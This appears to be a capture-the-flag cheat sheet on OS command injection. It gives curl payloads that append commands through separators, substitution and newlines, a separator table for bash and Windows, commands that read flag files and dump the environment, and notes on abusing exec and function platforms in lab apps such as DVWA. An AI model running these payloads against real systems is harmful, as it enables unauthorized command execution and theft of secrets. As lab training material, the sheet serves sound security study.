# OS command injection (CWE-78)

**Signs**: the feature obviously runs a system tool — ping/traceroute/nslookup/whois, backup/tar/zip,
convert/resize, "audit"/"list" a directory, "run diagnostic", log writer, "exec into pod". Output
looks like terminal output. Hint "the answer comes from deeper", "one word splits the line".

Two variants (deck): attacker controls **arguments** of a fixed program (append a command), or the
**program name** itself (command override).

## 1. Confirm
```bash
curl -s -d 'host=127.0.0.1;id'  $T/ping       # uid=... ⇒ injected
curl -s -d 'host=127.0.0.1|id'  $T/ping
curl -s -d 'host=$(id)'         $T/ping
curl -s -d 'host=`id`'          $T/ping
curl -s --data-urlencode $'host=127.0.0.1\nid' $T/ping     # newline
curl -s -d 'host=127.0.0.1;sleep 5' $T/ping -w '%{time_total}\n'   # blind: timing
```
Forms send `+` as space; with `curl -d` encode `;`=`%3b`, `&`=`%26`, `|`=`%7c`, newline=`%0a`
or use `--data-urlencode`.

## 2. Separators & substitution (bash/sh)

| Syntax | Runs second command… |
|---|---|
| `a; b` | always |
| `a && b` | if a succeeds |
| `a \|\| b` | if a fails |
| `a \| b` | b gets a's output (b's output shown) |
| `a`<newline>`b` | always (`%0a`) |
| `` `b` `` / `$(b)` | inline substitution — works **inside** quotes `"..."` and in the middle of an argument |
| `a & b` | a in background, b runs |

Windows `cmd.exe`: `&`, `&&`, `|`, `||`, `%VAR%`, `^` escape. PowerShell: `;`, `$(...)`.

## 3. Read the flag
```bash
host=x;cat /flag/flag
host=x;cat /flag*;ls -la /;env
dir=catalog; cat /flag/flag           # argument of tar
requester=x$(cat /flag/flag)          # substitution into a log line
```
If output isn't shown → [cmdi-blind-oob](cmdi-blind-oob.md). Filter in the way →
[cmdi-filter-bypass](cmdi-filter-bypass.md). Want a shell → [reverse-shells](../11-post-exploitation/reverse-shells.md).

## Exec APIs / function platforms
"Exec into pod", "deploy function", "run job" features often build `sh -c "<body or args>"`.
- The *pod/name* is allow-listed, the **command isn't** → put your command in `args`.
- A "function body" is literally the shell command; the "input" is piped to it.
- Isolation claims are UI copy: same uid ⇒ same file access.

Seen in: `inj1` (ping `;`), `inj5` (tar dir `;`), `inj7` (`$()` in log), `inj13` (exec `args`/function
body, word `flag` filtered → octal printf), DVWA "Command Injection", bWAPP "OS Command Injection".
